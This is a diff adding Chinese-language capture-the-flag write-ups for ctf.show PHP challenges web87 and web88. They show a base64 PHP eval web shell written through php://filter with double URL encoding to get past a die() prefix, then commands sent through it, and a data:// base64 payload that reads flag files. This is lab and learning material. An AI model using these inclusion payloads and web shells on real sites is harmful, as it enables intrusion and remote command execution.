@@ -286,34 +286,93 @@ if(isset($_GET['file'])){
 } 
 ```
 
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+这道题帮我加深了我的绕过，我甚至之前都没彻底理解了getshell，现在我才理解到这个真正的含义。
 
+可以看到有file\_put\_contents,我们就应该猜到是用php://filter协议，又因为后面有死亡绕过，我们再来一个base64解码。
 
+所以我们往file里面传入的不是php代码了，而是一个协议，我们在当前目录下写入一个getshell。
 
+首先在hackbar里面写入post和get两个参数，content需要base64加密绕过，并且因为php die是6个字符，所以需要往base64字符串前面添加两个字符。我们的content想实现的是\<?php @eval($\_POST\[x]);?>
 
+因为这样我们可以写入一个shell，然后我们可以向x里面传递执行命令的参数。
 
-```http
+```url
+content=abPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
+```
+
+而file因为我们看到一个url解码函数，并且为了绕过一些关键词，所以我们需要两次url加密。而且是全加密（用burpsuite上面的可以实现全加密），resource可以是等于任意名字的php文件。
+
+```url
+http://1bd6bcd0-f840-4cc2-9665-0601cbe23a6d.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+然后我们就会看到一片空白，这说明我们的文件已经上传上去了，getshell。yes。
+
+然后我们接下来直接访问该目录下的这个php文件，然后直接访问这个getshell，往getshell里面传参，去查看当前目录下的文件。
+
+然后我们可以传参去查看f开头的文件。你也可以先传入system('ls');去查看当前目录下的文件。
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+最后得到flag。
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:purple;background-color:green;">（11）web88</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-17 02:27:25
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+ */
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
+        die("error");
+    }
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
 ```
 
 
 
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
+可以看到过滤了php的协议，但是没有过滤=，所以我们用data://伪协议直接传递php代码，然后执行
 
+所以我们写入的为\<?php cat f\*.php?>，并且因为php被过滤了，所以我们需要用base64加密的那一句。
 
+```url
+http://597fa6fc-ea54-4078-b972-0c0e6295813d.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioucGhwIik7Pz4
+```
 
+我相信肯定有小伙伴和我之前写一样，最后有个等号，然后出来一个error，因为这个题过滤了等号，所以要把等号删掉（其实这个地方我不是很理解，我删掉了，base64还能解码成功吗）后面想到每三个转化为四个，也许能执行？，我不知道，这个有小伙伴知道吗。
 
+就这样按照他的写吧
 
+然后查看源码，发现flag。
 
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
+***
 
-
-
-
-
-
-
-
-
+## <mark style="color:purple;background-color:green;">（12）WEB  116</mark>
 
 
 
